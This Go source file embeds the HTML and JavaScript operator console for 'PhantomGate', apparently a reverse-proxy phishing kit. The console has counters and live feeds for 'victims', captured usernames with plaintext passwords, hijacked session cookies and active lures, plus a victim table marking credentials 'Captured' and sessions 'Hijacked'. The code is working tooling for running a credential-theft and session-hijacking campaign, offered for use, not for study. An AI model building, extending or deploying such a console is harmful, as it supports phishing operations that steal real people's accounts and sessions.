package dashboard

// dashboardHTML is the embedded operator dashboard UI
const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PhantomGate — Operator Console</title>
  <style>
    :root {
      --bg-primary: #0a0a0f;
      --bg-secondary: #111118;
      --bg-card: #16161e;
      --border: #2a2a3a;
      --text-primary: #e4e4e7;
      --text-secondary: #71717a;
      --accent: #ef4444;
      --accent-dim: rgba(239, 68, 68, 0.15);
      --accent-glow: rgba(239, 68, 68, 0.4);
      --green: #22c55e;
      --yellow: #eab308;
      --blue: #3b82f6;
      --font-mono: 'SF Mono', 'Cascadia Code', 'Fira Code', 'Consolas', 'Liberation Mono', monospace;
      --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: var(--bg-primary);
      color: var(--text-primary);
      font-family: var(--font-sans);
      min-height: 100vh;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: repeating-linear-gradient(
        0deg, transparent, transparent 2px,
        rgba(239, 68, 68, 0.02) 2px, rgba(239, 68, 68, 0.02) 4px
      );
      pointer-events: none;
      z-index: 9999;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 24px;
      border-bottom: 1px solid var(--border);
      background: var(--bg-secondary);
    }

    .header h1 {
      font-family: var(--font-mono);
      font-size: 18px;
      font-weight: 700;
      color: var(--accent);
      letter-spacing: 2px;
      text-transform: uppercase;
    }

    .header h1 span { color: var(--text-secondary); font-weight: 400; }

    .status-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      font-family: var(--font-mono);
      font-size: 12px;
      color: var(--green);
      padding: 6px 14px;
      border: 1px solid rgba(34, 197, 94, 0.3);
      border-radius: 20px;
      background: rgba(34, 197, 94, 0.08);
    }

    .status-badge::before {
      content: '';
      width: 8px; height: 8px;
      background: var(--green);
      border-radius: 50%;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.4); }
      50% { opacity: 0.7; box-shadow: 0 0 0 6px rgba(34, 197, 94, 0); }
    }

    .stats-row {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 16px;
      padding: 20px 24px;
    }

    .stat-card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 20px;
      position: relative;
      overflow: hidden;
    }

    .stat-card::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--accent), transparent);
    }

    .stat-card .label {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: var(--text-secondary);
      font-family: var(--font-mono);
      margin-bottom: 8px;
    }

    .stat-card .value {
      font-size: 32px;
      font-weight: 800;
      color: var(--text-primary);
      font-family: var(--font-mono);
    }

    .stat-card.creds .value { color: var(--accent); }
    .stat-card.sessions .value { color: var(--green); }
    .stat-card.lures .value { color: var(--blue); }

    .main-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
      padding: 0 24px 24px;
    }

    .panel {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 12px;
      overflow: hidden;
    }

    .panel-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 14px 18px;
      border-bottom: 1px solid var(--border);
      background: rgba(255,255,255,0.02);
    }

    .panel-header h2 {
      font-family: var(--font-mono);
      font-size: 13px;
      font-weight: 600;
      color: var(--accent);
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .panel-body {
      padding: 16px 18px;
      max-height: 400px;
      overflow-y: auto;
    }

    .panel-body::-webkit-scrollbar { width: 4px; }
    .panel-body::-webkit-scrollbar-track { background: transparent; }
    .panel-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }

    .feed-item {
      display: flex;
      gap: 12px;
      padding: 12px;
      border: 1px solid var(--border);
      border-radius: 8px;
      margin-bottom: 10px;
      background: var(--bg-secondary);
      animation: slideIn 0.3s ease;
      transition: border-color 0.2s;
    }

    .feed-item:hover { border-color: var(--accent); }

    .feed-item.credential { border-left: 3px solid var(--accent); }
    .feed-item.session { border-left: 3px solid var(--green); }
    .feed-item.victim { border-left: 3px solid var(--blue); }

    @keyframes slideIn {
      from { transform: translateY(-10px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    .feed-icon {
      font-size: 20px;
      min-width: 30px;
      text-align: center;
      padding-top: 2px;
    }

    .feed-content {
      flex: 1;
      font-family: var(--font-mono);
      font-size: 12px;
      line-height: 1.6;
    }

    .feed-content .tag {
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 10px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .tag.cred { background: var(--accent-dim); color: var(--accent); }
    .tag.sess { background: rgba(34,197,94,0.15); color: var(--green); }
    .tag.new { background: rgba(59,130,246,0.15); color: var(--blue); }

    .feed-time {
      font-family: var(--font-mono);
      font-size: 10px;
      color: var(--text-secondary);
      white-space: nowrap;
    }

    .victim-table {
      width: 100%;
      border-collapse: collapse;
      font-family: var(--font-mono);
      font-size: 12px;
    }

    .victim-table th {
      text-align: left;
      padding: 10px 12px;
      color: var(--text-secondary);
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 1px;
      border-bottom: 1px solid var(--border);
    }

    .victim-table td {
      padding: 10px 12px;
      border-bottom: 1px solid rgba(255,255,255,0.03);
      color: var(--text-primary);
    }

    .victim-table tr:hover td {
      background: rgba(239, 68, 68, 0.05);
    }

    .captured-badge {
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 10px;
      font-weight: 600;
    }

    .captured-badge.yes { background: rgba(34,197,94,0.15); color: var(--green); }
    .captured-badge.no { background: rgba(113,113,122,0.15); color: var(--text-secondary); }

    .full-width { grid-column: 1 / -1; }

    .terminal {
      background: #000;
      border-radius: 8px;
      padding: 16px;
      font-family: var(--font-mono);
      font-size: 11px;
      line-height: 1.8;
      color: var(--green);
      max-height: 300px;
      overflow-y: auto;
    }

    .terminal .line { opacity: 0.9; }
    .terminal .line.error { color: var(--accent); }
    .terminal .line.warn { color: var(--yellow); }
    .terminal .line .ts { color: var(--text-secondary); }

    .empty-state {
      text-align: center;
      padding: 40px 20px;
      color: var(--text-secondary);
      font-family: var(--font-mono);
      font-size: 13px;
    }

    .empty-state .icon { font-size: 40px; margin-bottom: 12px; opacity: 0.5; }

    .auth-overlay {
      position: fixed;
      inset: 0;
      background: var(--bg-primary);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
    }

    .auth-box {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 40px;
      width: 380px;
      text-align: center;
    }

    .auth-box h2 {
      font-family: var(--font-mono);
      color: var(--accent);
      font-size: 20px;
      margin-bottom: 8px;
      letter-spacing: 2px;
    }

    .auth-box p { color: var(--text-secondary); font-size: 13px; margin-bottom: 24px; }

    .auth-box input {
      width: 100%;
      padding: 12px 16px;
      background: var(--bg-primary);
      border: 1px solid var(--border);
      border-radius: 8px;
      color: var(--text-primary);
      font-family: var(--font-mono);
      font-size: 14px;
      margin-bottom: 16px;
      outline: none;
    }

    .auth-box input:focus { border-color: var(--accent); }

    .auth-box button {
      width: 100%;
      padding: 12px;
      background: var(--accent);
      color: white;
      border: none;
      border-radius: 8px;
      font-family: var(--font-mono);
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.2s;
    }

    .auth-box button:hover { background: #dc2626; transform: translateY(-1px); }

    .auth-error {
      color: var(--accent);
      font-family: var(--font-mono);
      font-size: 12px;
      margin-bottom: 12px;
      display: none;
    }
  </style>
</head>
<body>

<div class="auth-overlay" id="authOverlay">
  <div class="auth-box">
    <h2>PHANTOMGATE</h2>
    <p>Operator Authentication Required</p>
    <div class="auth-error" id="authError">Invalid password</div>
    <input type="password" id="authPass" placeholder="Enter admin password..." autofocus>
    <button onclick="authenticate()">ACCESS CONSOLE</button>
  </div>
</div>

<div id="dashboard" style="display:none;">
  <div class="header">
    <h1>PHANTOMGATE <span>// Operator Console</span></h1>
    <div class="status-badge">PROXY ACTIVE</div>
  </div>

  <div class="stats-row">
    <div class="stat-card">
      <div class="label">Active Victims</div>
      <div class="value" id="statVictims">0</div>
    </div>
    <div class="stat-card creds">
      <div class="label">Credentials Captured</div>
      <div class="value" id="statCreds">0</div>
    </div>
    <div class="stat-card sessions">
      <div class="label">Sessions Hijacked</div>
      <div class="value" id="statSessions">0</div>
    </div>
    <div class="stat-card lures">
      <div class="label">Active Lures</div>
      <div class="value" id="statLures">0</div>
    </div>
  </div>

  <div class="main-grid">
    <div class="panel">
      <div class="panel-header">
        <h2>Live Feed</h2>
      </div>
      <div class="panel-body" id="liveFeed">
        <div class="empty-state">
          <div class="icon">.</div>
          Waiting for victim connections...
        </div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-header">
        <h2>Victims</h2>
      </div>
      <div class="panel-body" id="victimPanel">
        <div class="empty-state">
          <div class="icon">.</div>
          No victims captured yet
        </div>
      </div>
    </div>

    <div class="panel full-width">
      <div class="panel-header">
        <h2>System Log</h2>
      </div>
      <div class="panel-body">
        <div class="terminal" id="terminalLog">
          <div class="line"><span class="ts">[BOOT]</span> PhantomGate Operator Console initialized</div>
          <div class="line"><span class="ts">[BOOT]</span> Waiting for WebSocket connection...</div>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
let adminToken = '';
let ws = null;

function authHeaders() {
  return { 'X-Admin-Token': adminToken, 'Content-Type': 'application/json' };
}

function authenticate() {
  adminToken = document.getElementById('authPass').value;
  fetch('/api/stats', { headers: authHeaders() })
    .then(r => {
      if (r.status === 401) throw new Error('Unauthorized');
      return r.json();
    })
    .then(data => {
      document.getElementById('authOverlay').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
      updateStats(data);
      connectWS();
      fetchVictims();
      setInterval(refreshData, 5000);
    })
    .catch(() => {
      document.getElementById('authError').style.display = 'block';
      document.getElementById('authPass').style.borderColor = '#ef4444';
      document.getElementById('authPass').value = '';
    });
}

document.getElementById('authPass').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') authenticate();
});

function connectWS() {
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(proto + '//' + location.host + '/ws?token=' + encodeURIComponent(adminToken));
  ws.onopen = () => addLog('WebSocket connected to proxy engine', 'info');
  ws.onclose = () => { addLog('WebSocket disconnected, reconnecting...', 'warn'); setTimeout(connectWS, 3000); };
  ws.onmessage = (e) => {
    const msg = JSON.parse(e.data);
    handleEvent(msg);
  };
}

function handleEvent(msg) {
  const feed = document.getElementById('liveFeed');
  const empty = feed.querySelector('.empty-state');
  if (empty) empty.remove();

  const item = document.createElement('div');
  const now = new Date().toLocaleTimeString();

  switch (msg.type) {
    case 'credential':
      item.className = 'feed-item credential';
      item.innerHTML = '<div class="feed-icon">K</div><div class="feed-content"><span class="tag cred">CREDENTIAL</span><br>User: <b>' + escHTML(msg.data.username) + '</b><br>Pass: <b>' + escHTML(msg.data.password) + '</b><br>IP: ' + escHTML(msg.data.source_ip) + '</div><div class="feed-time">' + now + '</div>';
      addLog('CREDENTIAL CAPTURED: ' + msg.data.username, 'error');
      break;
    case 'session':
      item.className = 'feed-item session';
      const tokens = Object.keys(msg.data.cookies || {}).join(', ');
      item.innerHTML = '<div class="feed-icon">C</div><div class="feed-content"><span class="tag sess">SESSION</span><br>Tokens: <b>' + escHTML(tokens) + '</b><br>Victim: ' + escHTML(msg.data.victim_id).substring(0,12) + '...</div><div class="feed-time">' + now + '</div>';
      addLog('SESSION HIJACKED: ' + tokens, 'error');
      break;
    case 'new_victim':
      item.className = 'feed-item victim';
      item.innerHTML = '<div class="feed-icon">T</div><div class="feed-content"><span class="tag new">NEW VICTIM</span><br>IP: <b>' + escHTML(msg.data.ip) + '</b><br>ID: ' + escHTML(msg.data.id).substring(0,12) + '...</div><div class="feed-time">' + now + '</div>';
      addLog('New victim connected: ' + msg.data.ip);
      break;
  }

  feed.prepend(item);
  refreshData();
}

function refreshData() {
  fetch('/api/stats', { headers: authHeaders() }).then(r => r.json()).then(updateStats);
  fetchVictims();
}

function updateStats(data) {
  document.getElementById('statVictims').textContent = data.total_victims || 0;
  document.getElementById('statCreds').textContent = data.total_credentials || 0;
  document.getElementById('statSessions').textContent = data.total_sessions || 0;
}

function fetchVictims() {
  fetch('/api/victims', { headers: authHeaders() }).then(r => r.json()).then(victims => {
    const panel = document.getElementById('victimPanel');
    if (!victims || victims.length === 0) return;
    let html = '<table class="victim-table"><thead><tr><th>ID</th><th>IP</th><th>Creds</th><th>Session</th><th>First Seen</th></tr></thead><tbody>';
    victims.forEach(v => {
      const hasCreds = v.credentials && v.credentials.length > 0;
      const hasSess = v.sessions && v.sessions.length > 0;
      html += '<tr><td>' + escHTML(v.id).substring(0,12) + '...</td><td>' + escHTML(v.ip) + '</td>';
      html += '<td><span class="captured-badge ' + (hasCreds ? 'yes' : 'no') + '">' + (hasCreds ? 'Captured' : 'Pending') + '</span></td>';
      html += '<td><span class="captured-badge ' + (hasSess ? 'yes' : 'no') + '">' + (hasSess ? 'Hijacked' : 'Pending') + '</span></td>';
      html += '<td>' + new Date(v.first_seen).toLocaleString() + '</td></tr>';
    });
    html += '</tbody></table>';
    panel.innerHTML = html;
  });
}

function addLog(msg, level) {
  const terminal = document.getElementById('terminalLog');
  const line = document.createElement('div');
  line.className = 'line' + (level === 'error' ? ' error' : level === 'warn' ? ' warn' : '');
  const ts = new Date().toLocaleTimeString();
  line.innerHTML = '<span class="ts">[' + ts + ']</span> ' + escHTML(msg);
  terminal.appendChild(line);
  terminal.scrollTop = terminal.scrollHeight;
}

function escHTML(str) {
  if (!str) return '';
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
</script>
</body>
</html>`
